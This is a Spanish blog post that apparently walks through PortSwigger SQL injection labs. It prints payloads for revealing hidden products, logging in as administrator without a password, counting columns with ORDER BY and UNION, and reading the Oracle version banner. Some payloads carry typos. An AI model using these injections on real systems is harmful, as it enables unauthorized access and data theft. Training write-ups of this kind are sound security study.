---
typora-copy-images-to: ../../myassets/img/labs/
typora-root-url: ../../
layout: post

---

## **Obtener datos ocultos**

Accedemos a PortSwigger para realizar el primer laboratorio. En el primero realizaremos una inyección SQL para obtener datos ocultos de una página web.

Vamos a probar la siguiente inyección:

```sql
filter?category=Tech+gifts'--
```

Con el uso de los dos guiones, el rest de consulta que vaya despúes se considera un comentario; lo que acaba de ocurrir es que la base de datos va a ignorar AND released = 1 provocando que se puedan obtener todos los productos de la categoría Tech Gifts sin tener en cuenta la flag *released*.

![](/PePs/myassets/img/labs/1.png)



Vamos a probar otra inyección para qu se muestren TODOS los productos de la página.

```sql
filter?category=Tech+gifts'+OR+1=1--
```

![](/PePs/myassets/img/labs/2.png)



Con esta inyección, habremos solucionado el laboratorio.

![](/PePs/myassets/img/labs/3.png)



## **Subvertir la funcionalidad de la página**

En el siguiente laboratorio, trataremos de logearnos mediante el uso de una inyección SQL. 

En el campo de usuario escribiremos administrator'-- y en el campo de contraseña escribiremos ''

![5](/PePs/myassets/img/labs/5.png)

Nos logeamos y habremos resuelto el laboratorio.

![4](/PePs/myassets/img/labs/4.png)



## **Determinar el número de columnas necesarias en un ataque UNION  de inyección SQL**

Mediante inyeccioens SQL podemos averiguar cuantas columnas consta la base de datos a la cual estamos haciendo el ataque. 

La primera forma es mediante la cláusula ORDER BY e ir incrementando el índice hasta que se produzca un error.

```sql
' ORDER BY 3--
```

![7](/PePs/myassets/img/labs/7.png)



Otro método es especificar vlaores nulos hasta que de error.

```sql
' UNION SELECT NUL,NULL,NULL--
```

![8](/PePs/myassets/img/labs/8.png)



## **Extraer el tipo de base de datos y verisón**

Comprobamos con una consulta básica si podemos extraer información de la base de datos.

```sql
'+UNION+SELECT+'abc'+'def'+FROM+DUAL--
```

![9](/PePs/myassets/img/labs/9.png)



Para poder extraer la versión de la abse de datos ejecutamos la siguiente inyección:

```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

![10](/PePs/myassets/img/labs/10.png)



Y obtenemos el siguiente resultado:

![11](/PePs/myassets/img/labs/11.png)